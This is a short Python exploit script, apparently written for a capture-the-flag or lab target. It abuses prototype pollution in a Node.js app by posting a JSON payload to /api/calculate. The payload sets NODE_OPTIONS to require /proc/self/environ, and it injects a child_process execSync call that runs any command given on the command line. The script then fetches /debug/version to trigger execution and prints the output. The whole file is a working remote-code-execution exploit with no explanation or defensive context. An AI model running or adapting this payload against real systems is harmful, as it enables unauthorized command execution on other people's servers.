# coded by d4rkstat1c
import requests
import json
from sys import argv, exit

def get_args():
	try:
		return argv[1], argv[2]
	except IndexError:
		exit('Usage: python3 ' + argv[0] + ' <target_url> <cmd>')

def gen_payload(cmd):
	payload_dict = {
		'constructor': {
			'prototype': {
				'env': {
					'x': 'console.log(require("child_process").execSync("{cmd}").toString())//'.format(cmd=cmd)
				},
				'NODE_OPTIONS': '--require /proc/self/environ'
			}
		}
	}
	return json.dumps(payload_dict)

def main():
	target, cmd = get_args()

	# http header data + payload
	headers = {'Content-Type': 'application/json'}
	json_payload = gen_payload(cmd)

	# Send payload/POST request to /api/calculate to exploit prototype pollution
	requests.post(target + '/api/calculate', headers=headers, data=json_payload)
	
	# Trigger fork to spawn new process and gain RCE via calling --require against environment variables
	r = requests.get(target + '/debug/version')
	print(r.text)

if __name__ == '__main__':
	main()
